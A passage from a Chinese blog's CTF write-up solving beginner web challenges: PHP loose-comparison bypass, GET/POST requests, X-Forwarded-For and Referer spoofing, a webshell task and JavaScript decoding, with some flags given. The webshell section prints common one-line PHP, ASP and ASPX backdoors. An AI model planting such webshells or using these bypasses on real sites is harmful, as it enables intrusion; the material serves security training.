<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">掌握php弱类型比较</span><br><span class="line">php中其中两种比较符号:</span><br><span class="line">&#x3D;&#x3D;：先将字符串类型转化成相同，再比较</span><br><span class="line">&#x3D;&#x3D;&#x3D;：先判断两种字符串的类型是否相等，再比较</span><br><span class="line">字符串和数字比较使用&#x3D;&#x3D;时,字符串会先转换为数字类型再比较</span><br><span class="line">var_dump(&#39;a&#39; &#x3D;&#x3D; 0);&#x2F;&#x2F;true，此时a字符串类型转化成数字，因为a字符串开头中没有找到数字，所以转换为0</span><br><span class="line">var_dump(&#39;123a&#39; &#x3D;&#x3D; 123);&#x2F;&#x2F;true，这里&#39;123a&#39;会被转换为123</span><br><span class="line"></span><br><span class="line">var_dump(&#39;a123&#39; &#x3D;&#x3D; 123);&#x2F;&#x2F;false，因为php中有这样一个规定：字符串的开始部分决定了它的值，如果该字符串以合法的数字开始，则使用该数字至和它连续的最后一个数字结束，否则其比较时整体值为0。</span><br><span class="line">举例：</span><br><span class="line">var_dump(&#39;123a1&#39; &#x3D;&#x3D; 123);&#x2F;&#x2F;true</span><br><span class="line">var_dump(&#39;1233a&#39; &#x3D;&#x3D; 123);&#x2F;&#x2F;false</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看完之后，是不是突然恍然大悟！所以我们尝试构造<strong>a=0a&amp;b=1234a</strong>输入</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_php/DE5%7D3O9%5B%40%40BTDQN%25O%5BSF%7BXU.png"></p>
<br>

<p>如此，取flag如探囊取物~</p>
</li>
</ul>
<ul>
<li><h2 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h2><hr>
<p>这道题很简单，就是让我们发送get请求和post请求。</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/get_post/M%5DGS%5BG%60AJ%7D6A_5J%29L%25LKYZR.png"></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/get_post/%40%29FMD3S1_I~%25QUZ~%40AK6%5B%7DI.png"></p>
<br>

<p>首先提示我们需要对他发送一个get请求，我们构造a=1进行发送get请求，然后返回结果</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/get_post/KHYZ%25IH3%28%600JE%40WMM%28PIVCU.png"></p>
<br>

<p>我们再用curl发送post请求，也可使用其他工具，这里使用windows自带的curl。不懂curl如何使用的兄弟可移步到我的另一篇博文</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/get_post/H6LU%60WBN%5DX2ZGGFUCM3~60V.png"></p>
<br>

<p>返回的结果中含有flag，ok，此题通关！</p>
</li>
</ul>
<ul>
<li><h2 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h2><hr>
<p>题目告诉我们是xff_referer，猜测是与xff和referer相关，打开环境看看</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/xff_referer/3N%5DA%7D%5DDIH~K4SN8%5B%299CDX0Y.png"></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/xff_referer/A_0D%40SG%28AGK0VCPC1%401N~UE.png"></p>
<br>

<p>我们先学习一下xff和referer的知识：</p>
<p>（1）<strong>X-Forwarded-For:</strong>  简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。xff 是http的拓展头部，作用是使Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff的作用在于记录用户的真实IP，以及代理服务器的IP。格式为：X-Forwarded-For: 本机IP, 代理1IP, 代理2IP, 代理2IP</p>
<p>（2）<strong>HTTP Referer:</strong>  是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是<em>从哪个页面链接过来</em>的，服务器基此可以获得一些信息用于处理。referer 是http的拓展头部，作用是记录当前请求页面的来源页面的地址。服务器使用referer确认访问来源，如果referer内容不符合要求，服务器可以拦截或者重定向请求。</p>
<br>

<p>我们先设置xff为123.123.123.123发送请求包，查看包信息</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/xff_referer/PQ7F0J%5BF%5BQ1IFZ%605C%29_4PV2.png"></p>
<br>

<p>提示我们地址必须来自<a href="https://www.google.com/">https://www.google.com</a></p>
<p>所以我们加上referer信息</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/xff_referer/6TO%40YJZ5U~~H1O_Z3%40%24X%7DP5.png"></p>
<p>发现响应包里含有flag，成功！这道题还可以使用我们强大的curl命令行工具</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/xff_referer/M9MHWII6E%2841I0Y8Z%7BB%7DQPW.png"></p>
</li>
<li><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><hr>
<p>这道题考的是webshell，诶，你不知道什么是webshell吗？webshell就是web下的shell ，也就是web网站的后门。</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/webshell/%5D3B~6AJ6BIRTDI62TL%5BH9PY.png"></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/webshell/FW8AU7XJALI0HR1%29RZ4%7B%7BQW.png"></p>
<p>页面已经给出我们shell，也是常用的php一句话木马</p>
<p>同时常用的一句话木马有：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php的一句话木马： &lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</span><br><span class="line">asp的一句话是：   &lt;%eval request (&quot;pass&quot;)%&gt;</span><br><span class="line">aspx的一句话是：  &lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure>

<p>给出连接密码webshell，那我们直接蚁剑连接就好</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/webshell/Z5%25II2N4%254R~%29R8DY~%405AN4.png"></p>
<p>然后连接到后台，在里面找到flag文件，打开获取flag即可~</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/webshell/%5DS%244%25EXCQ1PS03D%5B%7DCP5%7DDL.png"></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/webshell/Z5%25II2N4%254R~%29R8DY~%405AN4.png"></p>
</li>
</ul>
<ul>
<li><h2 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h2><hr>
<p>打开题目，题目名字告诉我们和js有关，这让我着实慌了一会，因为我对js没有怎么去学过。</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_js/%28A4HX0%24I98LMS1_M%60%5BD2OEA.png"></p>
<p>打开页面后弹出一个输入密码的框，乱输一阵，哈哈嗝。</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_js/ZX%40BKAX1E%7DD3IZWJ%25%25DQ4IM.png"></p>
<p>返回一段英文，显示告诉我们这是假密码，我们去找一下有没有东西，诶，发现了！我们尝试审计一下代码</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_js/K%25%29ZR5%25N%24XC236QA~5FVBMB.png"></p>
<p>发现定义了一些参数和好像有点多余的for循环，好吧，有点迷，最后一个弹窗也是和前面定义的参数毫无关系。不过发现有个可疑的变量和dechiffre后面跟着的字符串。尝试解码一下pass，这变量名字不错，希望有点用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x=[<span class="number">70</span>,<span class="number">65</span>,<span class="number">85</span>,<span class="number">88</span>,<span class="number">32</span>,<span class="number">80</span>,<span class="number">65</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">87</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">68</span>,<span class="number">32</span>,<span class="number">72</span>,<span class="number">65</span>,<span class="number">72</span>,<span class="number">65</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">    print(chr(i),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<br>

<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_js/W%40A5KAWD%28V6QXG%298XZ%5BH%24WC.png"></p>
<p>解码得到另一个字符串，看起来不像是什么加密的结构，这让我有点迷。淦，忽然想起来前面题目开始就提示我们flga结构，于是拿着字符串去构造了一下flag提交，Cyberpeace{786OsErtk12}，发现居然成功了！！！！</p>
<p>确实是simple_js哈哈哈，后面发现下边这段字符串也可以解密出结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string = <span class="string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span></span><br><span class="line">s_list = string.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s_list:</span><br><span class="line">    i = chr(int(i))</span><br><span class="line">    res += i</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<br>



</li>
</ul>
<h1 id="高手进阶区"><a href="#高手进阶区" class="headerlink" title="高手进阶区"></a>高手进阶区</h1><ul>
<li><h2 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h2><hr>
<p>有点激动，终于到高手web进阶区了，慢慢走向高手的路了是不是？好吧好吧，不吹了，来看看题目</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/baby_web/2QD4IVBA_IZPP_%2425STG%28%28N.png"></p>
<p>题目提示我们是初始页面，打开是一个1.php，尝试输入了一下index.php,发现存在这个页面，但302跳转了</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/baby_web/VC70ZU3IO_B8ZM7Q%28~93O%5DX.png"></p>
<p>然后使用curl请求一下，curl工具默认不随着302跳转</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/baby_web/HY40G4%601ZEH%7DEGO2EN%25~498.png"></p>
<p>flag就出来了，妥妥的签到题呀哈哈嗝。</p>
<p>后来发现其实刚开始就已经给出flag了，汗！</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/baby_web/YY4%24SZRJG~%7DGSJ%5DHWPE~6XO.png"></p>
</li>
</ul>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
</search>
